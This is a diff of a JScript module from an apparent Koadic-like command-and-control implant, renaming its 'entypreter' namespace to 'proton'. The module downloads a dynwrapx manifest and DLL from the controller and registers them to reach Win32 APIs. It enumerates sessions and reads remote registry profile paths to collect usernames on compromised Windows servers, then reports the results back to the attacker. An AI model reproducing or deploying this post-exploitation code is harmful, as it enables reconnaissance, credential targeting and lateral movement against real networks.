@@ -12,7 +12,7 @@ function win32_register_via_dynwrapx(manifestPath)
 
 function resolve(hostname)
 {
-    var results = entypreter.shell.exec("ping -n 1 -4 "+hostname, "~DIRECTORY~\\"+Koaidc.uuid()+".txt");
+    var results = proton.shell.exec("ping -n 1 -4 "+hostname, "~DIRECTORY~\\"+Koaidc.uuid()+".txt");
     return results.split("[")[1].split("]")[0];
 }
 
@@ -76,7 +76,7 @@ function read_registryusers(server, ip)
 {
     try
     {
-        var reg = entypreter.registry.provider(server);
+        var reg = proton.registry.provider(server);
     }
     catch (e)
     {
@@ -108,7 +108,7 @@ function read_registryusers(server, ip)
             session['cname'] = ip;
             var path = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\"+sids[i];
             var key = "ProfileImagePath";
-            var profile = entypreter.registry.read(entypreter.registry.HKLM, path, key, entypreter.registry.STRING, server).SValue;
+            var profile = proton.registry.read(proton.registry.HKLM, path, key, proton.registry.STRING, server).SValue;
             session['username'] = profile.split("\\").pop().split(".")[0];
             users.push(session);
         }
@@ -190,9 +190,9 @@ function parse_sessions(sessions)
 
 try
 {
-    var manifestPath = entypreter.file.getPath("~DIRECTORY~\\dynwrapx.manifest");
-    entypreter.http.download(manifestPath, "~MANIFESTUUID~");
-    entypreter.http.download("~DIRECTORY~\\dynwrapx.dll", "~DLLUUID~");
+    var manifestPath = proton.file.getPath("~DIRECTORY~\\dynwrapx.manifest");
+    proton.http.download(manifestPath, "~MANIFESTUUID~");
+    proton.http.download("~DIRECTORY~\\dynwrapx.dll", "~DLLUUID~");
     var win32 = win32_register_via_dynwrapx(manifestPath);
 
     var bufptrptr = win32.MemAlloc(4);//if 64bit, 8
@@ -247,17 +247,17 @@ try
         sessions_string = parse_sessions(sessions);
         var headers = {};
         headers["RESULTS"] = "SESSIONS";
-        entypreter.work.report(sessions_string, headers);
-        entypreter.work.report("Complete");
+        proton.work.report(sessions_string, headers);
+        proton.work.report("Complete");
     } else {
         //no servers
     }
 
-    //entypreter.work.report("Success");
+    //proton.work.report("Success");
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
